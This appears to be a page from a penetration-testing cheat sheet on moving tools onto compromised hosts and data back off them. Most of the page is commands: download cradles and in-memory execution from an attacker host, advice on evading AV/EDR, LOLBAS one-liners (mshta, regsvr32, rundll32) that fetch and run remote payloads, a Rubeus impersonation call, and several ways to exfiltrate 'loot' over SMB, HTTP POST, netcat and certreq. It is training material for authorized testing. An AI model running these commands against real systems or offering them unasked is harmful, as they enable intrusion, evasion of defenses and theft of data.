# File Transfers

Getting tools onto a target and loot back off it. Sounds trivial until you're on a locked-down Windows box with no `wget`, or a stripped Linux host with no `curl`. Know several methods per platform so a blocked binary never stops you mid-engagement. This is the connective tissue of post-exploitation — you stage [payloads](shells-payloads.md), drop [credential-dumping](credential-dumping.md) tools, and exfil hashes with it.

{% hint style="warning" %}
`certutil` and PowerShell download-cradles are heavily signatured by AV/EDR. On a monitored engagement prefer SMB, encode/rename payloads, or transfer in-memory. Note anything you drop to disk so you can clean it up and document it.
{% endhint %}

## Serve files from your attacker box

Stand up a server first — most methods pull from one of these:

```bash
python3 -m http.server 80                                    # HTTP
php -S 0.0.0.0:8080                                          # PHP built-in
ruby -run -e httpd . -p 8080                                 # Ruby
python3 -m uploadserver 8080                                 # HTTP with upload endpoint

# SMB — best for Windows targets
sudo impacket-smbserver share $(pwd) -smb2support
sudo impacket-smbserver share $(pwd) -smb2support -user a -password a   # Win10+ often needs auth

# FTP
python3 -m pyftpdlib -w -p 21
```

## Download to a Linux target

| Method | Command |
| --- | --- |
| **wget** | `wget http://<ATTACKER_IP>/file -O /tmp/file` |
| **curl** | `curl http://<ATTACKER_IP>/file -o /tmp/file` (or `-O` for original name) |
| **Python** | `python3 -c 'import urllib.request; urllib.request.urlretrieve("http://<ATTACKER_IP>/file","/tmp/file")'` |
| **/dev/tcp** (no tools) | `exec 3<>/dev/tcp/<ATTACKER_IP>/80; echo -e "GET /file HTTP/1.0\r\n\r" >&3; cat <&3` |
| **scp** | `scp file user@<TARGET>:/tmp/` |
| **Netcat** | receiver `nc -lnvp 4444 > file` / sender `nc <ATTACKER_IP> 4444 < file` |
| **openssl (TLS)** | server side below |

Encrypted transfer with openssl when you want it off the wire in cleartext:

```bash
# Attacker
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
# Target
openssl s_client -connect <ATTACKER_IP>:80 -quiet > LinEnum.sh
```

## Download to a Windows target

### PowerShell

```powershell
Invoke-WebRequest -Uri "http://<ATTACKER_IP>/file" -OutFile "C:\temp\file"     # IWR alias works too
(New-Object System.Net.WebClient).DownloadFile("http://<ATTACKER_IP>/PowerUp.ps1","C:\Windows\Temp\PowerUp.ps1")

# Fileless — run straight from memory (download cradle)
IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')
powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/script.ps1')"
```

Load a .NET assembly entirely in memory (great for Rubeus/SharpHound without touching disk):

```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://<ATTACKER_IP>/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:hash /impersonateuser:admin /msdsspn:cifs/file01 /ptt".Split())
```

### LOLBAS one-liners

```powershell
certutil -urlcache -split -f http://<ATTACKER_IP>:<PORT>/<FILE> C:\Windows\Temp\<FILE>
```

```cmd
certutil -decode encoded.b64 decoded.exe                                        # also decodes base64
bitsadmin /transfer job /download /priority high http://<ATTACKER_IP>/file C:\temp\file
```

### SMB

```cmd
copy \\<ATTACKER_IP>\share\file C:\temp\file
net use \\<ATTACKER_IP>\share /user:a a                                          # auth if needed
```

### RDP drive redirection

```bash
xfreerdp /v:<TARGET> /u:USER /p:PASS /drive:share,/tmp/share
```

## Exfil loot back to your box

```powershell
# Windows → your hosted SMB share
copy C:\loot.zip \\<ATTACKER_IP>\share\

# Base64 through a shell when no channel exists (paste → decode on Kali)
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.bin"))
[IO.File]::WriteAllBytes("C:\file.exe",[Convert]::FromBase64String("<BASE64_STRING>"))

# POST to an upload server / listener
$b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\loot.zip"))
Invoke-WebRequest -Uri http://<ATTACKER_IP>:8000/ -Method POST -Body $b64
```

```bash
# Linux → your box
scp file user@<ATTACKER_IP>:/tmp/
nc -lvnp 4444 > out          # receiver on Kali
nc <ATTACKER_IP> 4444 < file # sender on target
base64 -w0 file              # print base64, paste, decode: echo '<B64>' | base64 -d > file
curl -X POST http://<ATTACKER_IP>:8080/upload -F 'files=@/path/to/file'   # to uploadserver
```

### certreq.exe exfil (Windows LOLBAS)

```bash
sudo nc -lvnp 8000                                                              # attacker
```

```cmd
certreq.exe -Post -config http://<ATTACKER_IP>:8000/ C:\Windows\win.ini         # target POSTs the file
```

## Living off the land (LOTL) execution-from-remote

When you want to *execute* a remote payload rather than save it, these Windows binaries fetch and run in one shot — useful past application whitelisting:

```cmd
mshta http://webserver/payload.hta
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
rundll32 \\webdavserver\folder\payload.dll,entrypoint
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
cmd.exe /k < \\webdavserver\folder\batchfile.txt
cscript //E:jscript \\webdavserver\folder\payload.txt
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```

{% hint style="info" %}
Reference libraries for finding a binary that isn't blocked: **LOLBAS** ([lolbas-project.github.io](https://lolbas-project.github.io/)) — search `/download` and `/upload` for Windows; **GTFOBins** ([gtfobins.github.io](https://gtfobins.github.io/)) — search `+file download` / `+file upload` for Linux.
{% endhint %}

## Anonymous WebDAV (zero-credential Windows mount)

WebDAV lets Windows Explorer mount a share with **no credentials** and no client software — and it's the backbone of `.Library-ms` client-side chains (see [Shells & Payloads](shells-payloads.md)).

```bash
sudo apt install python3-wsgidav
mkdir /home/kali/webdav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```

Windows target — pull a file with zero tools:

```cmd
copy \\<ATTACKER_IP>@80\payload.exe C:\Windows\Temp\payload.exe
net use z: \\<ATTACKER_IP>@80\
```

Windows may need the **WebClient** service — check `sc query WebClient`; if stopped, `net start WebClient` (admin) or trigger a user-mode start via `.Library-ms`.

Linux target:

```bash
cadaver http://<ATTACKER_IP>/                                    # interactive
curl -T /tmp/loot.tar.gz http://<ATTACKER_IP>/loot.tar.gz        # upload
sudo mount -t davfs http://<ATTACKER_IP>/ /mnt/dav               # mount
```

## Encrypting transfers

```bash
# openssl symmetric (Linux both ends)
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

```powershell
# Windows — Invoke-AESEncryption module
Import-Module .\Invoke-AESEncryption.ps1
Invoke-AESEncryption -Mode Encrypt -Key "p@ssword" -Path .\scan-results.txt
```

## Where downloads land

Useful for hunting what a prior operator (or the user) fetched:

```
C:\Users\<user>\AppData\Local\Microsoft\Windows\Temporary Internet Files\
C:\Users\<user>\AppData\Local\Microsoft\Windows\INetCache\IE\<subdir>
C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\
```

## Method-selection reference

| Situation | Reach for |
| --- | --- |
| Windows, AV watching | SMB share, in-memory `DownloadData`, WebDAV |
| Windows, no PowerShell | `certutil`, `bitsadmin`, WebDAV `copy` |
| Linux, no wget/curl | `/dev/tcp`, `scp`, openssl s_client |
| No inbound channel at all | base64 paste through the shell |
| Need it off the wire encrypted | openssl s_server/s_client, AES pre-encrypt |
| Only outbound HTTP allowed | `http.server` + `certreq -Post` / curl POST |

## Workflow

```
# 1. Stand up a server (python3 -m http.server / impacket-smbserver)
# 2. Pull the tool onto the target with a method its defenses allow
# 3. Prefer in-memory execution when AV is present (IEX / DownloadData)
# 4. Do the work (enumerate, dump, escalate)
# 5. Exfil loot the same way in reverse (SMB copy / base64 / POST)
# 6. Clean up dropped files and record what you touched
```

## Related

* [Shells & Payloads](shells-payloads.md) — the payloads you're staging, and the `.Library-ms`/WebDAV client-side chain
* [Credential Dumping](credential-dumping.md) — get mimikatz/procdump on target, pull dumps back
* [Pivoting & Tunneling](pivoting-tunneling.md) — transfer chisel/ligolo agents onto the pivot
* [Lateral Movement](lateral-movement.md) — stage tools on each new host as you spread
* [Windows Privesc](windows-privesc-methodology.md) · [Linux Privesc](linux-privesc-methodology.md) — deliver privesc enumeration scripts and exploits
* [Report Writing](report-writing.md) — note every file dropped and the transfer method used
